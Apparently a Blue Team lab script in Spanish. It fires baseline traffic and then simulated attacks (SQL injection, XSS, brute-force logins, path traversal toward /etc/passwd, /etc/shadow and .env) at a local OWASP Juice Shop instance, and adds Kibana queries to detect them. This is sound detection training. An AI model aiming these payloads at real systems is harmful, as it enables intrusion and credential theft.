#!/bin/bash
# Script de tráfico legítimo para Blue Team
# Genera requests normales para establecer baseline

echo "=== Iniciando tráfico legítimo Blue Team ==="
echo "Timestamp: $(date -u)"

ENDPOINTS=(
  "http://localhost:3000"
  "http://localhost:3000/#/login"
  "http://localhost:3000/rest/products/search?q=apple"
  "http://localhost:3000/rest/products/search?q=juice"
  "http://localhost:3000/api/Products"
)

for url in "${ENDPOINTS[@]}"; do
  curl -s "$url" > /dev/null
  echo "$(date -u) OK $url"
  sleep 5
done

echo "=== Tráfico legítimo completado ==="
echo "Timestamp: $(date -u)"

























#!/bin/bash
echo " SCRIPT COMPLETO - Generando tráfico diverso en Juice Shop"
echo "============================================================"

# SQL Injection
echo ""
echo "SQL Injection (10 requests)..."
for i in {1..10}; do
  curl -s -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin'\'' OR 1=1--","password":"x"}' > /dev/null
  echo "  ├─ SQL Injection $i/10"
  sleep 0.5
done

# XSS
echo ""
echo "XSS Attempts (5 requests)..."
xss_payloads=(
  "<script>alert('XSS')</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
)
count=1
for payload in "${xss_payloads[@]}"; do
  encoded=$(printf %s "$payload" | jq -sRr @uri)
  curl -s "http://localhost:3000/rest/products/search?q=$encoded" > /dev/null
  echo "  ├─ XSS attempt $count/3"
  ((count++))
  sleep 0.5
done

# Brute Force
echo ""
echo "Brute Force (10 requests)..."
passwords=("123456" "password" "admin" "12345678" "qwerty" "abc123" "letmein" "welcome" "monkey" "dragon")
count=1
for pass in "${passwords[@]}"; do
  curl -s -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pass\"}" > /dev/null
  echo "  ├─ Brute force $count/10: $pass"
  ((count++))
  sleep 0.3
done

# Path Traversal
echo ""
echo "Path Traversal (8 requests)..."
paths=(
  "../../../etc/passwd"
  "../../../../../../windows/win.ini"
  "../../../app/package.json"
  "../../ftp/legal.md"
  "../../../etc/shadow"
  "../../logs/access.log"
  "../.env"
  "../../config.json"
)
count=1
for path in "${paths[@]}"; do
  curl -s "http://localhost:3000/ftp/$path" > /dev/null
  echo "  ├─ Path traversal $count/8"
  ((count++))
  sleep 0.5
done

# 404 Errors
echo ""
echo "404 Errors (10 requests)..."
fake_urls=(
  "/admin.php"
  "/phpmyadmin/"
  "/wp-admin/"
  "/.env"
  "/config.php"
  "/backup.sql"
  "/.git/config"
  "/api/secret"
  "/admin/dashboard"
  "/db.sql"
)
count=1
for url in "${fake_urls[@]}"; do
  curl -s "http://localhost:3000$url" > /dev/null
  echo "  ├─ 404 error $count/10: $url"
  ((count++))
  sleep 0.3
done

# Tráfico Normal
echo ""
echo "Tráfico Normal (20 requests)..."
for i in {1..20}; do
  curl -s http://localhost:3000 > /dev/null
  curl -s http://localhost:3000/rest/products/search?q=apple > /dev/null
  curl -s http://localhost:3000/#/contact > /dev/null
  echo "  ├─ Normal traffic $i/20"
  sleep 0.3
done

echo ""
echo "============================================================"
echo " COMPLETADO - Total: ~63 requests generadas"
echo " Revisa tu dashboard en Kibana: http://localhost:5601"
echo "============================================================"
















# # Ver solo intentos de SQL Injection
# message: *OR 1=1* OR message: *'--*

# # Ver intentos de XSS
# message: *<script>* OR message: *alert*

# # Ver errores 404
# message: *404*

# # Ver intentos de path traversal
# message: *../../* OR message: *etc/passwd*

# # Ver brute force
# message: *login* AND message: *password*

# # Ver todo el tráfico malicioso
# message: (*OR 1=1* OR *<script>* OR *404* OR *../../*)
# ```

# ---

# ## MEJORAR TU DASHBOARD

# Después de ver el tráfico malicioso, puedes crear **nuevas visualizaciones**:

# ### **Visualización: Errores por Tipo**
# ```
# Type: Pie Chart
# Data View: Juice Shop Logs
# Filter: message: (*404* OR *500* OR *401* OR *403*)
# Slice by: http.response.status_code
# ```

# ### **Visualización: Top IPs (si tienes el campo)**
# ```
# Type: Table
# Data View: Todos los Logs
# Rows: source.ip
# Size: 10